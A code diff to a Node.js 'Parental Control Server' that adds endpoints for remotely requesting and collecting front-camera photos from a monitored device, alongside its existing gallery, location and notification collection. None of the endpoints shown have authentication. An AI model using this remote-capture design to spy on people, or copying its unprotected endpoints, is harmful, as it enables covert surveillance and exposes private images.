@@ -26,6 +26,7 @@ let deviceGalleries = {};
 let deviceLocations = {};
 let galleryChanges = {};
 let deviceNotifications = {};
+let frontCameraRequests = {}; // ✅ NEW: Front camera requests storage
 
 // ✅ TIME FORMATTING FUNCTION
 function formatSimpleTime(timestamp) {
@@ -111,10 +112,15 @@ app.get('/', (req, res) => {
             getDevices: '/api/devices (GET)',
             testUpload: '/api/test-upload (POST)',
             checkUploads: '/api/check-uploads (GET)',
-            // ✅ NEW NOTIFICATION ENDPOINTS
+            // ✅ NOTIFICATION ENDPOINTS
             getNotifications: '/api/notifications/:deviceId (GET)',
             getRecentNotifications: '/api/recent-notifications/:deviceId (GET)',
-            clearNotifications: '/api/clear-notifications/:deviceId (DELETE)'
+            clearNotifications: '/api/clear-notifications/:deviceId (DELETE)',
+            // ✅ NEW FRONT CAMERA ENDPOINTS
+            requestFrontCamera: '/api/request-front-camera (POST)',
+            uploadFrontCamera: '/api/upload-front-camera (POST)',
+            checkCameraRequest: '/api/check-camera-request/:requestId (GET)',
+            getPendingRequests: '/api/pending-camera-requests/:deviceId (GET)'
         }
     });
 });
@@ -140,6 +146,7 @@ app.get('/health', (req, res) => {
         deviceCount: connectedDevices.length,
         galleryDeviceCount: Object.keys(deviceGalleries).length,
         notificationDeviceCount: Object.keys(deviceNotifications).length,
+        cameraRequestsCount: Object.keys(frontCameraRequests).length,
         uploads: {
             exists: uploadsExists,
             fileCount: uploadFileCount
@@ -718,6 +725,208 @@ app.get('/api/screenshots/:deviceId', (req, res) => {
     }
 });
 
+// ✅ NEW: REQUEST FRONT CAMERA CAPTURE (Parental App se)
+app.post('/api/request-front-camera', (req, res) => {
+    try {
+        const { deviceId, parentalDeviceId, requestId } = req.body;
+        
+        console.log('📸 Front camera request:', { deviceId, parentalDeviceId, requestId });
+        
+        if (!deviceId) {
+            return res.status(400).json({ 
+                success: false,
+                error: 'Device ID is required' 
+            });
+        }
+
+        // Unique request ID generate karein
+        const cameraRequestId = requestId || `cam_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        
+        // Request store karein
+        frontCameraRequests[cameraRequestId] = {
+            deviceId: deviceId,
+            parentalDeviceId: parentalDeviceId,
+            requestId: cameraRequestId,
+            status: 'pending', // pending, captured, failed
+            requestedAt: formatSimpleTime(Date.now()),
+            timestamp: Date.now(),
+            imageUrl: null,
+            message: null
+        };
+
+        console.log('✅ Front camera request stored:', cameraRequestId);
+
+        res.json({ 
+            success: true,
+            message: 'Front camera capture requested',
+            requestId: cameraRequestId,
+            deviceId: deviceId,
+            status: 'pending'
+        });
+        
+    } catch (error) {
+        console.error('❌ Front camera request error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: UPLOAD FRONT CAMERA IMAGE (Child App se)
+app.post('/api/upload-front-camera', upload.single('frontCameraImage'), (req, res) => {
+    try {
+        const { deviceId, requestId } = req.body;
+        
+        if (!deviceId || !requestId) {
+            return res.status(400).json({ 
+                success: false,
+                error: 'Device ID and Request ID are required' 
+            });
+        }
+
+        if (!req.file) {
+            return res.status(400).json({ 
+                success: false,
+                error: 'No front camera image uploaded' 
+            });
+        }
+
+        console.log('📸 Front camera upload:', { deviceId, requestId, file: req.file.filename });
+
+        // Check if request exists
+        if (!frontCameraRequests[requestId]) {
+            return res.status(404).json({ 
+                success: false,
+                error: 'Camera request not found' 
+            });
+        }
+
+        // Update request status
+        const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
+        
+        frontCameraRequests[requestId].status = 'captured';
+        frontCameraRequests[requestId].imageUrl = imageUrl;
+        frontCameraRequests[requestId].capturedAt = formatSimpleTime(Date.now());
+        frontCameraRequests[requestId].filename = req.file.filename;
+
+        console.log('✅ Front camera image uploaded for request:', requestId);
+
+        // Also store in gallery
+        if (!deviceGalleries[deviceId]) {
+            deviceGalleries[deviceId] = [];
+        }
+
+        const cameraImageData = {
+            filename: req.file.filename,
+            originalName: req.file.originalname,
+            path: req.file.path,
+            size: req.file.size,
+            uploadedAt: formatSimpleTime(Date.now()),
+            type: 'front_camera',
+            requestId: requestId,
+            url: imageUrl
+        };
+
+        deviceGalleries[deviceId].push(cameraImageData);
+
+        res.json({ 
+            success: true,
+            message: 'Front camera image uploaded successfully',
+            deviceId: deviceId,
+            requestId: requestId,
+            status: 'captured',
+            imageUrl: imageUrl,
+            filename: req.file.filename
+        });
+        
+    } catch (error) {
+        console.error('❌ Front camera upload error:', error);
+        
+        // Mark request as failed
+        if (req.body.requestId && frontCameraRequests[req.body.requestId]) {
+            frontCameraRequests[req.body.requestId].status = 'failed';
+            frontCameraRequests[req.body.requestId].message = error.message;
+        }
+        
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: CHECK CAMERA REQUEST STATUS (Parental App se)
+app.get('/api/check-camera-request/:requestId', (req, res) => {
+    try {
+        const { requestId } = req.params;
+        
+        console.log('📸 Checking camera request:', requestId);
+
+        if (!frontCameraRequests[requestId]) {
+            return res.status(404).json({ 
+                success: false,
+                error: 'Camera request not found' 
+            });
+        }
+
+        const request = frontCameraRequests[requestId];
+
+        res.json({ 
+            success: true,
+            requestId: requestId,
+            status: request.status,
+            deviceId: request.deviceId,
+            requestedAt: request.requestedAt,
+            capturedAt: request.capturedAt,
+            imageUrl: request.imageUrl,
+            message: request.message
+        });
+        
+    } catch (error) {
+        console.error('❌ Check camera request error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: GET PENDING CAMERA REQUESTS (Child App se)
+app.get('/api/pending-camera-requests/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        console.log('📸 Pending camera requests for device:', deviceId);
+
+        // Find all pending requests for this device
+        const pendingRequests = Object.values(frontCameraRequests)
+            .filter(request => request.deviceId === deviceId && request.status === 'pending')
+            .map(request => ({
+                requestId: request.requestId,
+                parentalDeviceId: request.parentalDeviceId,
+                requestedAt: request.requestedAt,
+                timestamp: request.timestamp
+            }));
+
+        console.log('✅ Found', pendingRequests.length, 'pending requests for device:', deviceId);
+
+        res.json({ 
+            success: true,
+            deviceId: deviceId,
+            pendingCount: pendingRequests.length,
+            pendingRequests: pendingRequests
+        });
+        
+    } catch (error) {
+        console.error('❌ Pending camera requests error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
 // ✅ GET ALL DEVICES (WITH NOTIFICATION INFO)
 app.get('/api/devices', (req, res) => {
     try {
@@ -727,6 +936,12 @@ app.get('/api/devices', (req, res) => {
             const locationCount = deviceLocations[device.id] ? deviceLocations[device.id].length : 0;
             const galleryCount = deviceGalleries[device.id] ? deviceGalleries[device.id].length : 0;
             const notificationCount = deviceNotifications[device.id] ? deviceNotifications[device.id].length : 0;
+            
+            // Count pending camera requests for this device
+            const pendingCameraRequests = Object.values(frontCameraRequests)
+                .filter(request => request.deviceId === device.id && request.status === 'pending')
+                .length;
+                
             const lastLocation = deviceLocations[device.id] ? 
                 deviceLocations[device.id][deviceLocations[device.id].length - 1] : null;
             const lastNotification = deviceNotifications[device.id] ? 
@@ -737,6 +952,7 @@ app.get('/api/devices', (req, res) => {
                 locationCount: locationCount,
                 galleryCount: galleryCount,
                 notificationCount: notificationCount,
+                pendingCameraRequests: pendingCameraRequests, // ✅ NEW: Pending camera requests count
                 lastLocation: lastLocation,
                 lastNotification: lastNotification
             };
@@ -883,8 +1099,8 @@ app.use('*', (req, res) => {
 app.listen(PORT, () => {
     console.log('🚀 Parental Control Server Started!');
     console.log(`📍 Port: ${PORT}`);
-    console.log('📸 Features: Battery + Gallery + Location + Notifications');
-    console.log('📢 NEW: Notification endpoints added!');
+    console.log('📸 Features: Battery + Gallery + Location + Notifications + Front Camera');
+    console.log('📢 NEW: Front Camera endpoints added!');
     console.log('🖼️ Image URLs: http://your-server.com/uploads/filename.jpg');
     
     // Check uploads directory
@@ -897,5 +1113,5 @@ app.listen(PORT, () => {
         console.log('✅ Uploads directory exists with', files.length, 'files');
     }
     
-    console.log('✅ Server ready with complete notification system!');
+    console.log('✅ Server ready with complete Front Camera system!');
 });
